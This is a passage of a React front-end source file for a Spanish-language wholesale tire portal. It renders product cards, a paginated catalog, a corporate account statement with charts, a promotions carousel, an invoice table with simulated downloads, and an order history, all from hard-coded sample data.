                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.construction === 'R' ? 'Radial' : product.techSpecs.construction}</span>
                  </div>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>DIÁMETRO RIN ({product.techSpecs.rim})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>Tamaño de la rueda en pulgadas.</p>
                    </div>
                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.rim}"</span>
                  </div>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>ÍNDICE CARGA ({product.techSpecs.load})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>Peso máximo que soporta el neumático.</p>
                    </div>
                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.load}</span>
                  </div>
                  <div style={{ backgroundColor: 'white', padding: '10px 14px', borderRadius: '8px', border: '1px solid rgba(0,0,0,0.08)', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <div style={{ flex: 1 }}>
                      <p style={{ fontSize: '11px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>ÍNDICE VELOCIDAD ({product.techSpecs.speed.split(' ')[0]})</p>
                      <p style={{ fontSize: '10px', color: 'var(--grey-text)', margin: 0 }}>Velocidad máxima segura ({product.techSpecs.speed}).</p>
                    </div>
                    <span style={{ fontSize: '14px', fontWeight: 800, color: 'var(--status-operative)' }}>{product.techSpecs.speed.split(' ')[0]}</span>
                  </div>
                </div>
              </DetailSection>
            )}

            <DetailSection title="Especificaciones Adicionales" icon={<Info size={14} />} sectionKey="specs">
              <ul style={{ paddingLeft: '18px', margin: 0, color: 'var(--primary-navy)', listStyleType: 'square' }}>
                {product.specs?.map((spec, i) => <li key={i} style={{ marginBottom: '4px' }}>{spec}</li>)}
              </ul>
            </DetailSection>

            <DetailSection title="Descuentos por Volumen (Mayoreo)" icon={<TrendingUp size={14} />} sectionKey="volume">
              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                {product.discountTiers?.map((tier, i) => (
                  <div key={i} style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px', padding: '8px 12px', backgroundColor: 'white', borderRadius: '6px', border: '1px solid rgba(0,0,0,0.05)' }}>
                    <span style={{ fontWeight: 600 }}>De {tier.min}+ {product.unit}s</span>
                    <span style={{ fontWeight: 800, color: 'var(--status-operative)' }}>{tier.discount} OFF</span>
                  </div>
                ))}
              </div>
            </DetailSection>

            <DetailSection title="Existencia en Almacenes" icon={<Box size={14} />} sectionKey="stock">
              <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
                {product.availability && Object.entries(product.availability).map(([plant, qty]) => (
                  <div key={plant} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: '12px', padding: '4px 8px', backgroundColor: 'white', borderRadius: '4px' }}>
                    <span style={{ fontWeight: 600 }}>Plantel {plant}:</span>
                    <span style={{ fontWeight: 800, color: qty > 50 ? 'var(--status-operative)' : 'var(--status-caution)' }}>{qty} disp.</span>
                  </div>
                ))}
              </div>
            </DetailSection>
          </div>
        )}


        {cartItem ? (
          <div style={{
            marginTop: 'auto',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            backgroundColor: 'var(--bg-slate)',
            borderRadius: '8px',
            padding: '6px',
            border: '1px solid var(--grey-border)'
          }}>
            <button
              onClick={() => onUpdateQty(product.id, -1)}
              style={{
                width: '40px',
                height: '40px',
                borderRadius: '6px',
                border: 'none',
                backgroundColor: 'white',
                color: 'var(--primary-navy)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                boxShadow: '0 2px 4px rgba(0,0,0,0.05)'
              }}
            >
              <Minus size={18} />
            </button>
            <div style={{ textAlign: 'center' }}>
              <span style={{ fontSize: '16px', fontWeight: 800, color: 'var(--primary-navy)', display: 'block' }}>{cartItem.quantity}</span>
              <span style={{ fontSize: '10px', color: 'var(--grey-text)', textTransform: 'uppercase', fontWeight: 600 }}>En Carrito</span>
            </div>
            <button
              onClick={() => onUpdateQty(product.id, 1)}
              style={{
                width: '40px',
                height: '40px',
                borderRadius: '6px',
                border: 'none',
                backgroundColor: 'var(--primary-navy)',
                color: 'white',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                cursor: 'pointer',
                boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
              }}
            >
              <Plus size={18} />
            </button>
          </div>
        ) : (
          <button
            onClick={() => onAddToCart(product)}
            style={{
              marginTop: 'auto',
              backgroundColor: 'var(--primary-navy)',
              color: 'white',
              border: 'none',
              borderRadius: '8px',
              padding: '14px',
              fontSize: '14px',
              fontWeight: 700,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: '10px',
              boxShadow: '0 4px 12px rgba(26, 43, 60, 0.2)',
              transition: 'all 0.3s ease'
            }}
          >
            <Plus size={18} /> Agregar al Carrito
          </button>
        )}
      </div>
    </div>
  );
};

const CatalogView = ({ products, onAddToCart, onUpdateQty, cart, searchTerm, onSearchChange }) => {
  const [currentPage, setCurrentPage] = useState(1);
  const [showPriceInfo, setShowPriceInfo] = useState(false);
  const productsPerPage = 9;
  const totalPages = Math.ceil(products.length / productsPerPage);

  const indexOfLastProduct = currentPage * productsPerPage;
  const indexOfFirstProduct = indexOfLastProduct - productsPerPage;
  const currentProducts = products.slice(indexOfFirstProduct, indexOfLastProduct);

  const paginate = (pageNumber) => {
    setCurrentPage(pageNumber);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  };

  return (
    <div>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '32px' }}>
        <div>
          <h2 style={{ fontSize: '32px', color: 'var(--primary-navy)', marginBottom: '8px', fontWeight: 800 }}>Panel de Llantas y Accesorios</h2>
          <p style={{ color: 'var(--grey-text)', fontSize: '18px' }}>Precios especiales y disponibilidad en tiempo real para flotas y distribuidores.</p>

          <div style={{ position: 'relative', display: 'flex', alignItems: 'center', gap: '10px', backgroundColor: 'white', padding: '10px 16px', borderRadius: '10px', border: '1px solid var(--grey-border)', marginTop: '20px', width: 'fit-content', boxShadow: 'var(--shadow-sm)' }}>
            <Search size={18} color="var(--grey-text)" />
            <input
              type="text"
              placeholder="Filtrar por nombre o SKU..."
              value={searchTerm}
              onChange={(e) => onSearchChange(e.target.value)}
              style={{ background: 'none', border: 'none', outline: 'none', fontSize: '15px', width: '280px' }}
            />
          </div>
        </div>
        <div style={{ display: 'flex', gap: '12px', position: 'relative' }}>
          <div
            onMouseEnter={() => setShowPriceInfo(true)}
            onMouseLeave={() => setShowPriceInfo(false)}
            style={{
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
              padding: '14px 24px',
              backgroundColor: 'var(--status-operative)',
              color: 'white',
              borderRadius: '12px',
              fontWeight: 700,
              fontSize: '15px',
              boxShadow: '0 4px 15px rgba(16, 185, 129, 0.2)',
              cursor: 'help',
              transition: 'transform 0.2s',
              transform: showPriceInfo ? 'scale(1.02)' : 'scale(1)'
            }}
          >
            <CheckCircle2 size={18} /> LISTA DE PRECIOS MAYOREO ACTIVA
          </div>

          {showPriceInfo && (
            <div style={{
              position: 'absolute',
              top: '100%',
              right: 0,
              marginTop: '12px',
              backgroundColor: 'white',
              border: '1px solid var(--grey-border)',
              borderRadius: '12px',
              padding: '20px',
              width: '300px',
              boxShadow: '0 10px 25px rgba(0,0,0,0.1)',
              zIndex: 100,
              animation: 'fadeIn 0.2s ease'
            }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '12px', color: 'var(--primary-navy)' }}>
                <ShieldCheck size={20} />
                <span style={{ fontWeight: 800, fontSize: '14px', textTransform: 'uppercase' }}>Sesión Verificada</span>
              </div>
              <p style={{ color: 'var(--primary-navy)', fontWeight: 600, fontSize: '15px', marginBottom: '4px' }}>Socio Nivel Premium</p>
              <p style={{ color: 'var(--grey-text)', fontSize: '13px', marginBottom: '16px' }}>Tarifa preferencial para distribuidores autorizados.</p>

              <div style={{ height: '1px', backgroundColor: 'var(--grey-border)', marginBottom: '16px' }}></div>

              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '12px' }}>
                <span style={{ color: 'var(--grey-text)' }}>Vigencia de Precios:</span>
                <span style={{ fontWeight: 700, color: 'var(--primary-navy)' }}>31 DIC 2026</span>
              </div>
            </div>
          )}
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gap: '20px', marginBottom: '48px', alignItems: 'start' }}>
        {currentProducts.map((product) => (
          <ProductCard
            key={product.id}
            product={product}
            onAddToCart={onAddToCart}
            onUpdateQty={onUpdateQty}
            cartItem={cart.find(item => item.id === product.id)}
          />
        ))}
      </div>

      {/* Pagination Controls */}
      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px', marginTop: '32px' }}>
        <button
          onClick={() => paginate(Math.max(1, currentPage - 1))}
          disabled={currentPage === 1}
          style={{
            padding: '12px',
            borderRadius: '8px',
            border: '1px solid var(--grey-border)',
            backgroundColor: 'white',
            cursor: currentPage === 1 ? 'not-allowed' : 'pointer',
            opacity: currentPage === 1 ? 0.5 : 1,
            display: 'flex',
            alignItems: 'center'
          }}
        >
          <ChevronLeft size={20} />
        </button>

        {Array.from({ length: totalPages }).map((_, i) => (
          <button
            key={i}
            onClick={() => paginate(i + 1)}
            style={{
              width: '44px',
              height: '44px',
              borderRadius: '8px',
              border: '1px solid var(--grey-border)',
              backgroundColor: currentPage === i + 1 ? 'var(--primary-navy)' : 'white',
              color: currentPage === i + 1 ? 'white' : 'var(--primary-navy)',
              fontWeight: 700,
              cursor: 'pointer',
              transition: 'all 0.2s'
            }}
          >
            {i + 1}
          </button>
        ))}

        <button
          onClick={() => paginate(Math.min(totalPages, currentPage + 1))}
          disabled={currentPage === totalPages}
          style={{
            padding: '12px',
            borderRadius: '8px',
            border: '1px solid var(--grey-border)',
            backgroundColor: 'white',
            cursor: currentPage === totalPages ? 'not-allowed' : 'pointer',
            opacity: currentPage === totalPages ? 0.5 : 1,
            display: 'flex',
            alignItems: 'center'
          }}
        >
          <ChevronRight size={20} />
        </button>
      </div>
      <p style={{ textAlign: 'center', marginTop: '16px', color: 'var(--grey-text)', fontSize: '14px' }}>
        Mostrando {indexOfFirstProduct + 1}-{Math.min(indexOfLastProduct, products.length)} de {products.length} productos
      </p>
    </div>
  );
};

const AccountStatement = ({ user }) => {
  const [selectedNoteBar, setSelectedNoteBar] = useState('Selecciona una barra del gráfico para ver más información.');
  const [selectedNotePie, setSelectedNotePie] = useState('Selecciona una sección del gráfico para ver más información.');

  const statementData = [
    { name: 'Ene', cargo: 45000, abono: 38000 },
    { name: 'Feb', cargo: 52000, abono: 60000 },
    { name: 'Mar', cargo: user.balance, abono: 25000 },
    { name: 'Abr', cargo: 47000, abono: 52000 },
    { name: 'May', cargo: 51000, abono: 48000 }
  ];

  const spendCategories = [
    { name: 'Neumáticos', value: 58 },
    { name: 'Logística', value: 18 },
    { name: 'Servicios', value: 12 },
    { name: 'Otros', value: 12 }
  ];

  const COLORS = ['var(--accent-blue)', 'var(--primary-navy)', 'var(--status-operative)', 'var(--status-caution)'];

  const cards = [
    {
      label: 'Saldo Actual',
      value: `$${user?.balance?.toLocaleString() || '0'}`,
      icon: <CreditCard size={22} color="var(--status-stop)" />,
      topColor: 'var(--status-stop)'
    },
    {
      label: 'Línea de Crédito',
      value: `$${user?.creditLimit?.toLocaleString() || '0'}`,
      icon: <Shield size={22} color="var(--primary-navy)" />,
      topColor: 'var(--primary-navy)'
    },
    {
      label: 'Disponible',
      value: `$${((user?.creditLimit || 0) - (user?.balance || 0)).toLocaleString()}`,
      icon: <CheckCircle2 size={22} color="var(--status-operative)" />,
      topColor: 'var(--status-operative)'
    },
    {
      label: 'Facturas pendientes',
      value: '3',
      icon: <FileText size={22} color="var(--status-caution)" />,
      topColor: 'var(--status-caution)'
    },
    {
      label: 'Última factura',
      value: '2026-03-12',
      icon: <Clock size={22} color="var(--grey-text)" />,
      topColor: 'var(--grey-text)'
    }
  ];

  return (
    <div style={{ animation: 'fadeIn 0.4s ease' }}>
      <h2 style={{ fontSize: '28px', color: 'var(--primary-navy)', marginBottom: '24px' }}>Estado de Cuenta Corporativo</h2>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(210px, 1fr))', gap: '24px', marginBottom: '32px' }}>
        {cards.map((card, index) => (
          <div key={index} style={{ backgroundColor: 'white', padding: '24px', borderRadius: '12px', border: '1px solid var(--grey-border)', borderTop: `4px solid ${card.topColor}`, display: 'flex', flexDirection: 'column', gap: '10px' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
              <p style={{ fontSize: '12px', textTransform: 'uppercase', color: 'var(--grey-text)', marginBottom: 0 }}>{card.label}</p>
              {card.icon}
            </div>
            <p style={{ fontSize: '32px', fontWeight: 800, color: 'var(--primary-navy)', margin: 0 }}>{card.value}</p>
          </div>
        ))}
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1.5fr 1fr', gap: '24px', marginBottom: '32px' }}>
        <div style={{ backgroundColor: 'white', padding: '32px', borderRadius: '12px', border: '1px solid var(--grey-border)' }}>
          <h3 style={{ marginBottom: '24px' }}>Histórico de Movimientos</h3>
          <div style={{ height: '280px' }}>
            <ResponsiveContainer width="100%" height="100%">
              <BarChart data={statementData} margin={{ top: 0, right: 0, left: 0, bottom: 0 }}>
                <CartesianGrid strokeDasharray="3 3" vertical={false} strokeOpacity={0.2} />
                <XAxis dataKey="name" tick={{ fill: 'var(--grey-text)' }} />
                <YAxis tick={{ fill: 'var(--grey-text)' }} />
                <Tooltip />
                <Legend verticalAlign="top" height={36} />
                <Bar
                  dataKey="cargo"
                  fill="var(--status-stop)"
                  radius={[6, 6, 0, 0]}
                  name="Cargos"
                  onClick={(data) => setSelectedNoteBar(`Mes: ${data.name} — Cargos: $${data.cargo.toLocaleString()}. Los cargos representan montos facturados durante el mes.`)}
                />
                <Bar
                  dataKey="abono"
                  fill="var(--status-operative)"
                  radius={[6, 6, 0, 0]}
                  name="Abonos"
                  onClick={(data) => setSelectedNoteBar(`Mes: ${data.name} — Abonos: $${data.abono.toLocaleString()}. Los abonos son pagos recibidos en el mes.`)}
                />
              </BarChart>
            </ResponsiveContainer>
          </div>

          <div style={{ backgroundColor: 'var(--bg-slate)', borderRadius: '12px', padding: '18px', marginTop: '18px', border: '1px solid rgba(0,0,0,0.08)' }}>
            <p style={{ margin: 0, color: 'var(--primary-navy)', fontWeight: 600 }}>Detalle seleccionado:</p>
            <p style={{ margin: '8px 0 0', color: 'var(--grey-text)', fontSize: '14px' }}>{selectedNoteBar}</p>
          </div>
        </div>

        <div style={{ backgroundColor: 'white', padding: '32px', borderRadius: '12px', border: '1px solid var(--grey-border)' }}>
          <h3 style={{ marginBottom: '24px' }}>Distribución de gastos</h3>
          <div style={{ height: '280px' }}>
            <ResponsiveContainer width="100%" height="100%">
              <PieChart>
                <Pie
                  data={spendCategories}
                  dataKey="value"
                  nameKey="name"
                  innerRadius={60}
                  outerRadius={100}
                  paddingAngle={4}
                  onClick={(entry, index) => {
                    const payload = entry?.payload ?? entry;
                    const name = payload?.name ?? 'categoría';
                    const value = payload?.value ?? 0;
                    setSelectedNotePie(`Categoría: ${name} — Representa ${value}% del gasto total estimado.`);
                  }}
                >
                  {spendCategories.map((entry, idx) => (
                    <Cell key={entry.name} fill={COLORS[idx % COLORS.length]} />
                  ))}
                </Pie>
                <Legend verticalAlign="bottom" height={48} />
              </PieChart>
            </ResponsiveContainer>
          </div>

          <div style={{ backgroundColor: 'var(--bg-slate)', borderRadius: '12px', padding: '18px', marginTop: '18px', border: '1px solid rgba(0,0,0,0.08)' }}>
            <p style={{ margin: 0, color: 'var(--primary-navy)', fontWeight: 600 }}>Detalle seleccionado:</p>
            <p style={{ margin: '8px 0 0', color: 'var(--grey-text)', fontSize: '14px' }}>{selectedNotePie}</p>
          </div>
        </div>
      </div>
    </div>
  );
};

const PromotionsView = () => {
  const promotions = [
    {
      title: 'Descuento por Volumen',
      subtitle: 'Ahorra hasta 15% en pedidos mayores a 40 llantas.',
      details: [
        '15% de descuento a partir de 40 piezas.',
        'Aplicable en marcas seleccionadas (Michelin, Bridgestone, Continental).',
        'Válido hasta agotar existencias y sujeto a inventario en almacén.'
      ],
      period: 'Válido hasta 30 Abr 2026',
      theme: { from: '#1e3a8a', to: '#3b82f6' },
      bg: '/promo_realistic.png'
    },
    {
      title: 'Financiamiento Preferencial',
      subtitle: 'Financiamiento a 60 días sin intereses para clientes registrados.',
      details: [
        'Aprobación en menos de 24 horas.',
        'Requiere historial de compras de al menos 6 meses.',
        'Aplicable solo para facturación corporativa.'
      ],
      period: 'Disponible todo 2026',
      theme: { from: '#10b981', to: '#059669' },
      bg: '/cat_promos.png'
    },
    {
      title: 'Entrega Exprés',
      subtitle: 'Entrega garantizada en 48 horas para pedidos críticos.',
      details: [
        'Cobertura en 12 ciudades principales.',
        'Seguimiento en tiempo real de embarques.',
        'Soporte dedicado de logística.'
      ],
      period: 'Promoción continua',
      theme: { from: '#f59e0b', to: '#d97706' },
      bg: '/banner2_clean.png'
    }
  ];

  const [activeIndex, setActiveIndex] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setActiveIndex(i => (i + 1) % promotions.length);
    }, 7000);

    return () => clearInterval(timer);
  }, []);

  const active = promotions[activeIndex];

  return (
    <div style={{ animation: 'fadeIn 0.4s ease' }}>
      <h2 style={{ fontSize: '32px', color: 'var(--primary-navy)', marginBottom: '8px', fontWeight: 800 }}>Promociones Vigentes</h2>
      <p style={{ color: 'var(--grey-text)', fontSize: '18px', marginBottom: '32px' }}>
        Aprovecha las mejores condiciones de compra, crédito y logística para mantener tu flota siempre en movimiento.
      </p>

      <div style={{ position: 'relative', marginBottom: '32px' }}>
        <div style={{
          background: `linear-gradient(135deg, ${active.theme.from} 0%, ${active.theme.to} 65%, rgba(0,0,0,0.7) 100%), url(${active.bg})`,
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          borderRadius: '16px',
          padding: '40px 36px',
          color: 'white',
          boxShadow: '0 12px 30px rgba(0,0,0,0.15)',
          display: 'flex',
          flexDirection: 'column',
          gap: '20px',
          minHeight: '260px'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
            <div>
              <h3 style={{ fontSize: '28px', margin: 0 }}>{active.title}</h3>
              <p style={{ marginTop: '8px', fontSize: '16px', opacity: 0.9 }}>{active.subtitle}</p>
            </div>
            <span style={{ fontSize: '12px', opacity: 0.85, textTransform: 'uppercase' }}>{active.period}</span>
          </div>

          <ul style={{ paddingLeft: '18px', margin: 0, fontSize: '14px', lineHeight: 1.6 }}>
            {active.details.map((item, idx) => (
              <li key={idx} style={{ marginBottom: '6px' }}>{item}</li>
            ))}
          </ul>

          <div style={{ display: 'flex', gap: '10px', marginTop: 'auto' }}>
            {promotions.map((_, idx) => (
              <button
                key={idx}
                onClick={() => setActiveIndex(idx)}
                style={{
                  width: '14px',
                  height: '14px',
                  borderRadius: '50%',
                  border: 'none',
                  backgroundColor: idx === activeIndex ? 'rgba(255,255,255,0.9)' : 'rgba(255,255,255,0.3)',
                  cursor: 'pointer'
                }}
              />
            ))}
          </div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '24px' }}>
        {promotions.map((promo, idx) => (
          <div key={idx} style={{ backgroundColor: 'white', padding: '24px', borderRadius: '12px', border: '1px solid var(--grey-border)', boxShadow: '0 10px 20px rgba(0,0,0,0.06)' }}>
            <h4 style={{ marginBottom: '12px', fontSize: '18px', color: 'var(--primary-navy)' }}>{promo.title}</h4>
            <p style={{ marginBottom: '16px', color: 'var(--grey-text)' }}>{promo.subtitle}</p>
            <ul style={{ paddingLeft: '18px', margin: 0, color: 'var(--grey-text)', fontSize: '14px', lineHeight: 1.6 }}>
              {promo.details.map((d, i) => <li key={i} style={{ marginBottom: '6px' }}>{d}</li>)}
            </ul>
          </div>
        ))}
      </div>
    </div>
  );
};


const BillingView = () => {
  const invoices = [
    { uuid: 'E456-F123-B90A', date: '2026-03-12', total: '$14,500.00', status: 'Pagada' },
    { uuid: 'A902-D881-C110', date: '2026-03-15', total: '$32,100.00', status: 'Pendiente' },
    { uuid: 'C334-G742-D005', date: '2026-03-08', total: '$28,750.50', status: 'Pagada' },
    { uuid: 'B111-H926-E234', date: '2026-03-01', total: '$45,600.00', status: 'Pagada' },
    { uuid: 'F567-J234-K891', date: '2026-02-28', total: '$19,250.75', status: 'Pagada' },
    { uuid: 'D789-L456-M012', date: '2026-02-21', total: '$56,800.00', status: 'Pagada' },
    { uuid: 'G890-N678-O345', date: '2026-02-15', total: '$23,100.25', status: 'Pagada' },
    { uuid: 'H012-P901-Q567', date: '2026-02-10', total: '$37,450.00', status: 'Pagada' }
  ];

  const downloadFile = (filename, content, mime) => {
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const downloadPdf = (uuid) => {
    const content = `Factura: ${uuid}\n\nEste es un PDF simulado generado por el portal.`;
    downloadFile(`factura-${uuid}.pdf`, content, 'application/pdf');
  };

  const downloadXml = (uuid) => {
    const xml = `<?xml version="1.0" encoding="UTF-8"?>\n<invoice>\n  <uuid>${uuid}</uuid>\n  <amount>...</amount>\n</invoice>`;
    downloadFile(`factura-${uuid}.xml`, xml, 'application/xml');
  };

  return (
    <div style={{ animation: 'fadeIn 0.4s ease' }}>
      <h2 style={{ fontSize: '28px', color: 'var(--primary-navy)', marginBottom: '24px' }}>Facturación Electrónica (CFDI)</h2>
      <div style={{ backgroundColor: 'white', borderRadius: '12px', border: '1px solid var(--grey-border)', padding: '0' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
          <thead>
            <tr style={{ textAlign: 'left', backgroundColor: 'var(--primary-navy)', color: 'white' }}>
              <th style={{ padding: '16px 24px', fontSize: '12px', textTransform: 'uppercase' }}>Folio Fiscal (UUID)</th>
              <th style={{ padding: '16px 24px', fontSize: '12px', textTransform: 'uppercase' }}>Fecha</th>
              <th style={{ padding: '16px 24px', fontSize: '12px', textTransform: 'uppercase' }}>Monto</th>
              <th style={{ padding: '16px 24px', fontSize: '12px', textTransform: 'uppercase' }}>Estatus</th>
              <th style={{ padding: '16px 24px', fontSize: '12px', textTransform: 'uppercase' }}>Acciones</th>
            </tr>
          </thead>
          <tbody>
            {invoices.map((fact, idx) => (
              <tr key={idx} style={{ borderBottom: '1px solid var(--bg-slate)' }}>
                <td style={{ padding: '16px 24px', fontSize: '14px' }} className="mono">{fact.uuid}</td>
                <td style={{ padding: '16px 24px', fontSize: '14px' }}>{fact.date}</td>
                <td style={{ padding: '16px 24px', fontSize: '14px', fontWeight: 600 }}>{fact.total}</td>
                <td style={{ padding: '16px 24px' }}>
                  <span style={{ padding: '4px 8px', borderRadius: '4px', fontSize: '12px', backgroundColor: fact.status === 'Pagada' ? 'rgba(40, 167, 69, 0.1)' : 'rgba(255, 193, 7, 0.1)', color: fact.status === 'Pagada' ? 'var(--status-operative)' : '#b58900' }}>
                    {fact.status}
                  </span>
                </td>
                <td style={{ padding: '16px 24px' }}>
                  <div style={{ display: 'flex', gap: '8px' }}>
                    <button
                      onClick={() => downloadPdf(fact.uuid)}
                      style={{ padding: '6px 10px', borderRadius: '4px', border: '1px solid var(--grey-border)', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '12px' }}
                    >
                      <FileText size={12} /> PDF
                    </button>
                    <button
                      onClick={() => downloadXml(fact.uuid)}
                      style={{ padding: '6px 10px', borderRadius: '4px', border: '1px solid var(--grey-border)', cursor: 'pointer', display: 'flex', alignItems: 'center', gap: '4px', fontSize: '12px' }}
                    >
                      <FileText size={12} color="var(--accent-blue)" /> XML
                    </button>
                  </div>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
};

const OrdersView = () => {
  const [expandedOrder, setExpandedOrder] = useState(null);

  const orders = [
    {
      folio: 'ORD-2026-000142',
      orderDate: '2026-03-15',
      expectedDelivery: '2026-03-18',
      status: 'En tránsito',
      statusColor: 'var(--status-operative)',
      total: 45600,
      items: [
        { name: 'Llanta LT265/70R16 Michelin', quantity: 4, unit: 'piezas' },
        { name: 'Llanta P195/65R15 Continental', quantity: 8, unit: 'piezas' }
      ],
      referenceCode: 'MX-CDMX-001',
      carrierName: 'Logística Expedita'
    },
    {
      folio: 'ORD-2026-000139',
      orderDate: '2026-03-10',
      expectedDelivery: '2026-03-12',
      status: 'Entregado',
      statusColor: 'var(--status-operative)',
      total: 32500,
      items: [
        { name: 'Llanta 215/55R17 Bridgestone', quantity: 12, unit: 'piezas' }
      ],
      referenceCode: 'MX-MTY-002',
      carrierName: 'FedEx Logística',
      deliveredDate: '2026-03-12'
    },
    {
      folio: 'ORD-2026-000128',
      orderDate: '2026-02-28',
      expectedDelivery: '2026-03-05',
      status: 'Entregado',
      statusColor: 'var(--status-operative)',
      total: 78200,
      items: [
        { name: 'Llanta 225/45R18 Pirelli', quantity: 20, unit: 'piezas' },
        { name: 'Gel protector de llantas', quantity: 5, unit: 'cajas' }
      ],
      referenceCode: 'MX-GTO-003',
      carrierName: 'DHL México',
      deliveredDate: '2026-03-05'
    },
    {
      folio: 'ORD-2026-000115',
      orderDate: '2026-02-15',
      expectedDelivery: '2026-02-20',
      status: 'Entregado',
      statusColor: 'var(--status-operative)',
      total: 61450,
      items: [
        { name: 'Llanta 175/65R14 Goodyear', quantity: 16, unit: 'piezas' }
      ],
      referenceCode: 'MX-NL-004',
      carrierName: 'Estafeta',
      deliveredDate: '2026-02-20'
    }
  ];

  const getStatusBadge = (status) => {
    const styles = {
      'En tránsito': { bg: 'rgba(59, 130, 246, 0.1)', color: '#1e40af', label: '⏱️ En tránsito' },
      'Entregado': { bg: 'rgba(34, 197, 94, 0.1)', color: '#15803d', label: '✓ Entregado' },
      'Pendiente': { bg: 'rgba(245, 158, 11, 0.1)', color: '#b45309', label: '⊙ Pendiente' }
    };
    return styles[status] || styles['Pendiente'];
  };

  return (
    <div style={{ animation: 'fadeIn 0.4s ease' }}>
      <h2 style={{ fontSize: '28px', color: 'var(--primary-navy)', marginBottom: '8px' }}>Mis Órdenes</h2>
      <p style={{ fontSize: '15px', color: 'var(--grey-text)', marginBottom: '32px' }}>Historial y estado de tus pedidos de llantas y accesorios.</p>

      <div style={{ display: 'grid', gap: '16px' }}>
        {orders.map((order, idx) => {
          const badge = getStatusBadge(order.status);
          return (
            <div
              key={idx}
              style={{
                backgroundColor: 'white',
                borderRadius: '12px',
                border: '1px solid var(--grey-border)',
                overflow: 'hidden',
                boxShadow: '0 4px 12px rgba(0,0,0,0.05)',
                transition: 'all 0.3s ease'
              }}
              onMouseOver={e => {
                e.currentTarget.style.boxShadow = '0 8px 20px rgba(0,0,0,0.1)';
                e.currentTarget.style.transform = 'translateY(-2px)';
              }}
              onMouseOut={e => {
                e.currentTarget.style.boxShadow = '0 4px 12px rgba(0,0,0,0.05)';
                e.currentTarget.style.transform = 'translateY(0)';
              }}
            >
              {/* Header */}
              <div style={{ padding: '20px 24px', backgroundColor: 'var(--bg-slate)', borderBottom: '1px solid var(--grey-border)', display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start' }}>
                <div>
                  <h3 style={{ margin: '0 0 8px 0', fontSize: '16px', color: 'var(--primary-navy)', fontWeight: 800 }}>{order.folio}</h3>
                  <p style={{ margin: '0 0 4px 0', fontSize: '12px', color: 'var(--grey-text)' }}>Código de referencia: <span style={{ fontWeight: 600 }}>{order.referenceCode}</span></p>
                  <p style={{ margin: 0, fontSize: '12px', color: 'var(--grey-text)' }}>Transportista: <span style={{ fontWeight: 600 }}>{order.carrierName}</span></p>
                </div>
                <div style={{ textAlign: 'right' }}>
                  <div style={{ padding: '6px 12px', backgroundColor: badge.bg, color: badge.color, borderRadius: '8px', fontSize: '12px', fontWeight: 700, marginBottom: '12px' }}>
                    {badge.label}
                  </div>
                  <p style={{ margin: 0, fontSize: '24px', fontWeight: 800, color: 'var(--primary-navy)' }}>${order.total.toLocaleString()}</p>
                </div>
              </div>

              {/* Timeline */}
              <div style={{ padding: '20px 24px', display: 'grid', gridTemplateColumns: 'auto 1fr auto', gap: '16px', alignItems: 'center' }}>
                <div style={{ textAlign: 'center' }}>
                  <p style={{ margin: '0 0 4px 0', fontSize: '11px', textTransform: 'uppercase', color: 'var(--grey-text)', fontWeight: 700 }}>Fecha Pedido</p>
                  <p style={{ margin: 0, fontSize: '14px', fontWeight: 700, color: 'var(--primary-navy)' }}>{order.orderDate}</p>
                </div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '12px', justifyContent: 'center' }}>
